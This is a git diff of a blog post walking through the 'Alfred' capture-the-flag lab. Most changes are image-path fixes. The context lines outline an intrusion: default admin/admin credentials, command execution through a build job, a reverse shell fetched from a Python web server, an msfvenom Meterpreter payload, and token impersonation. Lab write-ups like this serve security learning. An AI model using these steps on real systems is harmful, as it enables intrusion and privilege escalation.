@@ -6,7 +6,7 @@ tag:
 - Windows
 - Meterpreter
 - Privilege Escalation
-image: /assets/images/pictures/Alfred/Alfred.png
+image: https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/Alfred.png
 headerImage: true
 category: blog
 author: DeShaun Ormond
@@ -43,11 +43,7 @@ nmap -sC -sV <boxip> -Pn
 10.10.51.179
 
 
-<<<<<<< HEAD
- ![nmap_scan](https://ormond5.github.io/MyBlog/pictures/Alfred/nmap.png)
-=======
  ![nmap_scan](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/nmap.png)
->>>>>>> b22af85fd09c889cb4ed3c9e883757f2348a84ff
 
 Our nmap scan shows 3 ports running on this box. Therefore we have our first answer. 
 
@@ -58,7 +54,7 @@ Our nmap scan shows 3 ports running on this box. Therefore we have our first ans
 
 From the nmap scan we see that we have two http services running. Navigate to the webserver on port 8080. You will see a login page. what are the chances that the manager didnt change the default credentials... let's try admin for both username and password
 
-![admin](https://ormond5.github.io/MyBlog/pictures/Alfred/adminlogin.png)
+![admin](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/adminlogin.png)
 
 We are in and we found our next flag! 
 
@@ -70,7 +66,7 @@ We are in and we found our next flag!
 
 The next question tells us to look for a tool that allows us to execute commands. After some clicking and snooping around you will find a place where you can input commands. 
 
-![flag3](/pictures/Alfred/projectbuild.png)
+![flag3](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/projectbuild.png)
 
 Replace 'whoami' with the command below and click apply and save. 
 ~~~
@@ -95,21 +91,21 @@ You also need to start up a web server, python allows for us to do this easily b
 python3 -m http.server 
 ~~~
 
-![httpserver](/pictures/Alfred/python-httpserver.png)
+![httpserver](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/python-httpserver.png)
 
 
 All together your terminals should look like this:
 
-![tmux](/pictures/Alfred/tmux0.png)
+![tmux](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/tmux0.png)
 
 
 Once you have the Powershell Script downloaded and the http server running navigate back to the project menu and select build. 
 
-![build](/pictures/Alfred/Build.png)
+![build](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/Build.png)
 
 Go back to your terminal and you should see on the python http server the victim ip reaching out and getting our Powershell script. Along with a shell opening up on your listening shell! 
 
-![tmux1](/pictures/Alfred/tmux.png)
+![tmux1](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/tmux.png)
 
 Once you are in, navigate to bill's Desktop directory and obtain the flag. 
 
@@ -132,7 +128,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder
 
 Open a new terminal and run the command above. I set the listening port on port 5555 and set the shell name to alfred.exe. Download that and you get our only flag
 
-![msfvenom](/pictures/Alfred/msfvenom.png)
+![msfvenom](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/msfvenom.png)
 
 {: .box-success}
 **Flag:** XXXXX
@@ -178,7 +174,7 @@ In your first shell run the command:
 ~~~
 'whoami /priv' 
 ~~~
-![priv](/pictures/Alfred/privilege.png)
+![priv](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/privilege.png)
 
 We see two of the most commonly abused privileges are enbabled! In your metasploit shell enter the command: 
 
@@ -189,9 +185,9 @@ list_tokens -g
 
 "Load incognito" will allow us to exploit this vulnerability and "list_tokens -g" will show us which tokens are available. Once we see which tokens are avaliable we can impersonate the one with the highest privilege "BUILTIN\Adminstrators" 
 
-![incognito](/pictures/Alfred/task3-2.png)
+![incognito](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/task3-2.png)
 
-![impersonate](/pictures/Alfred/Task3-flag3.png)
+![impersonate](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/Task3-flag3.png)
 
 ```
 Run getuid command to get the next flag
@@ -209,7 +205,7 @@ meterpreter> ps
 
 Once you have found the PID number, migrate to the PID to obtain privileged user permissions 
 
-![final flag](/pictures/Alfred/FinalFlag.png)
+![final flag](https://ormond5.github.io/MyBlog/assets/images/pictures/Alfred/FinalFlag.png)
 
 
 
